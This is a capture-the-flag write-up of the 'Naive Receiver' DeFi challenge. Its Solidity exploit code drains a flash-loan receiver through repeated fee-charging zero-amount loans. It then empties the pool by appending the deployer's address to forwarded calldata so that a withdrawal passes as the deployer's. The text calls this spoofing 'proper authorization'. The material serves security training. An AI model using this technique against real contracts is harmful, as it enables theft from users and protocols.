# Naive Receiver

There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.


# Overview of the solution
This function exploits a vulnerability in the FlashLoanReceiver contract by draining its funds through multiple flash loan calls, and then withdrawing all funds from the pool to a recovery address.

Step-by-Step Explanation

## Creating Multiple Flash Loan Calls:

```solidity
bytes[] memory callDatas = new bytes[](11);
for(uint i=0; i<10; i++){
    callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
}
```

This creates 10 flash loan calls with 0 amount. Even though the amount is 0, each call will still charge the fixed fee of 1 ETH to the receiver. This is the key vulnerability - the receiver doesn't validate the usefulness of the flash loan but pays the fee regardless.

## Adding Withdrawal Call:

```solidity
callDatas[10] = abi.encodePacked(
    abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
    bytes32(uint256(uint160(deployer)))
);
```

The 11th call is a withdrawal operation that takes all funds (pool + receiver) and sends them to the recovery address. The appended bytes32 value is the address of the deployer, which is needed because the _msgSender() function in the pool contract checks for this value when called through the forwarder.

## Preparing the Forwarder Request:

```solidity
bytes memory callData = abi.encodeCall(pool.multicall, callDatas);
BasicForwarder.Request memory request = BasicForwarder.Request(
    player,
    address(pool),
    0,
    gasleft(),
    forwarder.nonces(player),
    callData,
    1 days
);
```

This prepares a request to the forwarder to execute a multicall on the pool contract, which will execute all the callDatas in sequence.

## Creating and Signing the Request Hash:

```solidity
bytes32 requestHash = keccak256(
    abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
    )
);
(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
bytes memory signature = abi.encodePacked(r, s, v);
```

This creates a hash of the request according to EIP-712 standards and signs it with the player's private key.

## Executing the Request:

```solidity
forwarder.execute(request, signature);
```

This sends the signed request to the forwarder, which will execute the multicall on the pool.

## The Vulnerability
The key vulnerability is that the FlashLoanReceiver contract doesn't validate whether the flash loan is necessary or beneficial. Each flash loan call charges a fixed fee of 1 ETH, regardless of the loan amount. By making 10 flash loan calls with 0 amount, the attacker drains the receiver's 10 ETH balance through fees.

Additionally, the exploit uses the multicall functionality of the pool to batch all these operations in a single transaction, and the BasicForwarder to execute it with proper authorization.

## Conclusion
This test demonstrates a sophisticated attack that:

Drains the receiver's funds through unnecessary flash loan fees
Withdraws all funds from the pool
Does this in a single transaction using a meta-transaction pattern through the forwarder
The vulnerability highlights the importance of validating the necessity and benefit of operations that incur fees, especially in financial contracts.